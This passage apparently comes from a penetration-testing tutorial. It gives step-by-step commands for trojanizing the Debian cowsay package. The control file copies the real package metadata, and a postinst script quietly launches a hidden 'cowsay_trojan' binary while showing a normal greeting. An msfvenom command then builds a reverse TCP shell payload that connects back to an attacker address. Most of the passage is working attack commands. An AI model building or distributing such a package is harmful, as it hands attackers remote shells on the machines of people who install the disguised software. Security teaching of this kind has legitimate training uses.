+   3. Debian packages must adhere to a strict directory structure, so we need to create a subdirectory under the program's source directory, called DEBIAN:

```
root@kali:~/trojan# mkdir cowsay/DEBIAN
root@kali:~/trojan# cd cowsay/DEBIAN/
```

+   4. Next, we need to create the control file, which is the core of the Debian package, containing all relevant metadata such as package name, version, supported architectures, and dependencies:

```
root@kali:~/cowsay/DEBIAN# cat control
Package: cowsay
Version: 3.03+dfsg2-4
Architecture: all
Maintainer: Francois Marier <francois@debian.org>
Installed-Size: 90
Depends: perl
Suggests: filters
Section: games
Priority: optional
Homepage: http://www.nog.net/~tony/warez
Description: configurable talking cow
  Cowsay (or cowthink) will turn text into happy
  ASCII cows, with speech (or thought) balloons.
  If you don't like cows, ASCII art is available to replace
  it with some other creatures (Tux, the BSD
daemon, dragons, and a plethora of animals, from a
  turkey to an elephant in a snake).
```

+   5. Then we will create a post-installation file called postinst that will add the proper permissions to our payload, which will be called cowsay_trojan, and execute it:

```
root@kali:~/cowsay/DEBIAN# cat postinst
chmod 2755 /usr/games/cowsay_trojan && /usr/games
/cowsay_trojan & /usr/games/cowsay Welcome
```

+   6. Now that we have all the required files, we will generate the payload using msfvenom:

```
root@kali:~/cowsay/DEBIAN# msfvenom -a x64
--platform linux -p linux/x64/shell/reverse_tcp
LHOST=192.168.216.5 -b "\x00" -f elf -o
/root/cowsay/usr/games/cowsay_trojan
Found 2 compatible encoders
Attempting to encode payload with 1 iterations
of generic/none
```